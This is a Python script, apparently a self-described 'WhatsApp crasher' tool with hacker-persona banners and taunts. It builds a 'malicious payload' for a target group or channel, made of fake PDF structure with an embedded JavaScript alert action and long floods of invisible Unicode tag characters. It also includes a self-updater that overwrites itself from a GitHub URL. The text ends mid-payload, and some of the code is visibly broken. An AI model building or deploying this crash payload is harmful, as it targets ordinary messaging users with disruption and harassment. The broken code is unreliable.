
  
import os, sys, time, urllib
from socket import *
import json

ipaddr = gethostbyname(gethostname())
max_data = (((707+111+1011)*3)-1396)+5 #4096

white="\033[0m"
bg="\033[49m"
red="\033[91;1m"
blue="\033[94;1m"
green="\033[92;1m"
purple="\033[95;1m"

def slow(F3):
    for a in F3 + '\n':sys.stdout.write(a),sys.stdout.flush(),time.sleep(1./300)

def internet():
    try:
        s = socket(AF_NET, SOCK_STREAM)
        s.connect_ex(("www.google.com",80))
        return True
    except Exception:return False

def aboutus():
    slow("    Version        ::   v[1.3]")
    slow("    Author         ::   MR SMILE")
    slow("    Tool Name      ::   WHATSAPP BANER")
    slow("    Latest Update  ::   27 - OCT - 2025")
    slow("    Youtube        ::   https://www.youtube.com/@MrSmile_modders")
    slow(f"==========================================================={white}\n")


def banner():
    os.system("cls || clear")
    slow(f"""{blue}
    
   __        __ _           _         ____              _   ______            _ 
\ \      / /| |__   __ _| |_ ___  | __ )   __ _  ___| |_/ ___|  __ ___   _| |
 \ \ /\ / / | '_ \ / _` | __/ _ \ |  _ \  / _` |/ __| __\___ \ / _` \ \ / / |
  \ V  V /  | | | | (_| | ||  __/ | |_) || (_| | (__| |_ ___) | (_| |\ V /|_|
   \_/\_/   |_| |_|\__,_|\__\___| |____/  \__,_|\___|\__|____/ \__,_| \_/ (_) 

===========================================================""")


try:
    import phonenumbers, requests
except:
    banner()
    slow(f"""[!] Run The Command Below: 
    pip install requests phonenumbers
[!] And Finally, Run This Script:
    python3 {sys.argv[0]}\n{white}""")



import os
import subprocess
import sys
import urllib.request
import hashlib

try:
    import urllib.request, urllib.parse
except:
    banner()
    os.system("pip install --upgrade pip")
    os.system("pip install urllib2")


def set_malicious_payload(user):
    user_payload = f"‎‏\n\tattacker's message: {user}\n\t‎‏\n\tattacke's ip: {ipaddr}\n\twhatsapp crasher, created by ᴋɪɴɢ 𝓼ｍⅈ𝘭𝖊 😈☠😈" if user else ""

    data = {
        "attacker": f"{user_payload}",
        "MR SMILE": """HAHAHA!.\n\twe are 🎭 anonymous,\n\twe represent freedom,\n\twe oppose oppression,\n\twe are simply an evolution 🧬 of the technology system 👨🏾‍💻,\n\twhere liberty 🗽 is at risk,\n\texpect us 👥.

    ======================================================================================
        ‎‏         >> ᴍʀ sᴍɪʟᴇ 😈☠😈  <<      ‎‏ 
    ‎‏      >> whatsapp virus by ᴍʀ sᴍɪʟᴇ  <<      ‎‏ ‎‏ 
    ‎‏ >> Whats-ban tool by ᴍʀ sᴍɪʟᴇ😈☠😈 << ‎‏ 
    ======================================================================================
        """,
        "malicious-payload": """
    %PAYLOAD - 1.4
    %����
    1 0 obj
    <<
    /Type /Pages
    /Count: acountable
    /Kids [ 5 0 R 98 0 R 109 0 R 125 0 R 134 0 R 156 0 R 164 0 R 181 0 R 183 0 R 186 0 R 193 0 R 195 0 R 198 0 R 200 0 R 203 0 R 205 0 R 207 0 R 209 0 R 212 0 R 214 0 R 216 0 R 219 0 R 221 0 R 223 0 R 225 0 R 228 0 R 230 0 R 232 0 R 234 0 R 236 0 R 238 0 R 242 0 R 245 0 R 247 0 R 249 0 R 251 0 R 253 0 R 258 0 R 260 0 R 262 0 R 264 0 R 266 0 R 268 0 R 270 0 R 272 0 R 274 0 R 276 0 R 278 0 R 280 0 R 282 0 R 284 0 R 286 0 R 288 0 R 290 0 R 294 0 R 296 0 R 298 0 R 302 0 R 304 0 R 306 0 R 308 0 R 310 0 R 312 0 R 314 0 R 316 0 R 318 0 R 320 0 R 322 0 R 324 0 R 326 0 R 328 0 R 330 0 R 332 0 R 334 0 R 336 0 R 338 0 R 340 0 R 342 0 R 344 0 R 346 0 R 348 0 R 350 0 R 352 0 R 356 0 R 360 0 R 362 0 R 364 0 R 381 0 R 383 0 R 385 0 R 387 0 R 389 0 R 391 0 R 395 0 R 400 0 R 403 0 R 418 0 R 609 0 R 643 0 R 686 0 R ]
    >>
    endobj
    2 0 obj
    <<
    /Title (Whatsapp\055Crasher)
    /Author (coded\040by\040evilfeonix)
    >>
    endobj
    3 0 obj
    <<
    /Type /Catalog
    /Pages 1 0 R
    /Names <<
    /JavaScript <<
    /Names [ (bae1dfad\055702c\0554486\055ad90\0554963f37d45ec) 4 0 R ]
    ???
    ???
    ???
    endobj
    4 0 obj
    <<
    /Type /Action
    /S /JavaScript
    /JS (app\056alert\050\042evil\055feonix\040whatsapp-warm\042\051\073\012app\056alert\050\042al\055feonix\040whatsapp-warm1\042\051\073\012app\056alert\050\042al\055feonix\040whatsapp-warm2\042\051\073)
    >>
    endobj
    5 0 obj
    <<
    /Type /Page
    /Resources <<
    /ProcSet [ /PDF /Text /ImageB /ImageC /ImageI /PAYLOAD ]
    /ExtGState <<
    /G3 6 0 R
    ‎‏
    ‎‏
    >>
    /XObject <<
    /X5 8 0 R
    /X10 10 0 R
    >>
    /MediaBox [ 0 0 612 792 ]
    /Annots [ 85 0 R 86 0 R 87 0 R 88 0 R 89 0 R 90 0 R 91 0 R 92 0 R 93 0 R 94 0 R 95 0 R 96 0 R ]
    /Contents 97 0 R
    /Parent 1 0 R
    >>
    endobj
    6 0 obj
    <<
    /ca 1
    /BM /Normal
    >>
    endobj
    8 0 obj
    
    
    
    
    
    ������������
    ��������������
    ����������������
    <<
    /Type /XObject
    /Subtype /Image
    /Width 100
    /Height 97
    /ColorSpace [ /ICCBased 9 0 R ]
    /BitsPerComponent 8
    /Filter /DCTDecode
    /ColorTransform 0
    /Length 3311
     >>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
>>‎‏    Mr Smile 😈☠😈
    >>    https://mrsmile.online      <<
            jaydenofficial76@gmail.com@gmail.com  
        """
    }

    
    max_data_size = max_data
    data_size = len(json.dumps(data).encode("utf-8"))
    
    data["Hacker"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏         >>ᴍʀ sᴍɪʟᴇ 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ᴍʀ sᴍɪʟᴇ  <<      ‎‏
        ‎‏ >> https://github.com/xenocrypt01/smiley_b4n << ‎‏ 
        ‎‏ >> Whats-Crasher by ᴍʀ sᴍɪʟᴇ 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker1"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏                  >>ᴍʀ sᴍɪʟᴇ 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ᴍʀ sᴍɪʟᴇ  <<      ‎‏
        ‎‏ >> https://github.com/xenocrypt01/smiley_b4n << ‎‏ 
        ‎‏ >> Whats-Crasher by ᴍʀ sᴍɪʟᴇ 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker2"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏                  >>ᴍʀ sᴍɪʟᴇ 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ᴍʀ sᴍɪʟᴇ  <<      ‎‏
        ‎‏ >> https://github.com/xenocrypt01/smiley_b4n << ‎‏ 
        ‎‏ >> Whats-Crasher by ᴍʀ sᴍɪʟᴇ 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker3"] = f"""  attacker's ip: {ipaddr}...   
    ======================================================================================
            ‎‏         >>ᴍʀ sᴍɪʟᴇ 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ᴍʀ sᴍɪʟᴇ  <<      ‎‏
        ‎‏ >> https://github.com/xenocrypt01/smiley_b4n << ‎‏ 
        ‎‏ >> Whats-Crasher by ᴍʀ sᴍɪʟᴇ 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker4"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏                  >>ᴍʀ sᴍɪʟᴇ 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ᴍʀ sᴍɪʟᴇ  <<      ‎‏
        ‎‏ >> https://github.com/xenocrypt01/smiley_b4n << ‎‏ 
        ‎‏ >> Whats-Crasher by ᴍʀ sᴍɪʟᴇ 😈☠😈 << ‎‏ 
    ======================================================================================"""

    return data

def get_remote_hash(url):
    try:
        response = urllib.request.urlopen(url)
        data = response.read()
        return hashlib.md5(data).hexdigest()
    except Exception as e:
        print(f"Error fetching remote script: {e}")
        return None

def get_local_hash(script_path):
    try:
        with open(script_path, 'rb') as f:
            data = f.read()
            return hashlib.md5(data).hexdigest()
    except Exception as e:
        print(f"Error reading local script: {e}")
        return None

def updateus(): 
    try:
        script_url = "https://github.com/xenocrypt01/smiley_b4n/raw/main/crasher.py"
        script_path = os.path.abspath(__file__)
        
        remote_hash = get_remote_hash(script_url)
        local_hash = get_local_hash(script_path)
        
        if remote_hash and local_hash and remote_hash == local_hash:
            time.sleep(2)
            print(f"Whats-Crash is Up-To Date.{white}\n")
            return
        
        time.sleep(1)
        print(f"Update Found...")
        time.sleep(1)
        print(f"Downloading latest Version...")
        time.sleep(3)
        urllib.request.urlretrieve(script_url, script_path)
        print(f"Whats-Crash Successfully Updated...{white}\n")
        
        # # Restart the script
        # print("Restarting script...")
        # os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(f"Error Updating Whats-Crash: {e}{white}\n")


def notFound(url):
    os.system('clear || cls')
    slow(f"""{red}
 __        __ _           _         ____              _   ______            _ 
\ \      / /| |__   __ _| |_ ___  | __ )   __ _  ___| |_/ ___|  __ ___   _| |
 \ \ /\ / / | '_ \ / _` | __/ _ \ |  _ \  / _` |/ __| __\___ \ / _` \ \ / / |
  \ V  V /  | | | | (_| | ||  __/ | |_) || (_| | (__| |_ ___) | (_| |\ V /|_|
   \_/\_/   |_| |_|\__,_|\__\___| |____/  \__,_|\___|\__|____/ \__,_| \_/ (_)
===========================================================
    HAHAHA!. 💀☠💀               
    we are 🎭 anonymous 🤬,   
    we do not forgive 👿,  
    we do not forget 😈,
    expect us 👥 any time 👀.{red}
===========================================================
    Server: {url}
    Status: Server Not Found        
    Status_Code: 404        
    Message: 
       If you're about to crash Whatsapp Group/Channel
        ==>  The Group/Channel is Currently not Active         
        ==>  Or The Group/Channel URL is not Correct         

    Follow Us on Github
    Fork our Repositories  
    Give our Repositories a Star
    Contribute to our Repositories  
    Contact us at jaydenofficial76@gmail.com

           [+] Subscribe To Our YouTube Channel [+]
==========================================================={white}""")
    input(f"{red}Press [ENTER] to Continue...{white}") 
    evilfeonix="https://github.com/xenocrypt01" 
    os.system(f"xdg-open {evilfeonix}")
    print(f"{white}") 
    os.sys.exit()
 
def start_attack(msg,victim):
    payload = set_malicious_payload(msg)
    payload =  str(payload) + """
     󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔‎‏​‌‌󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉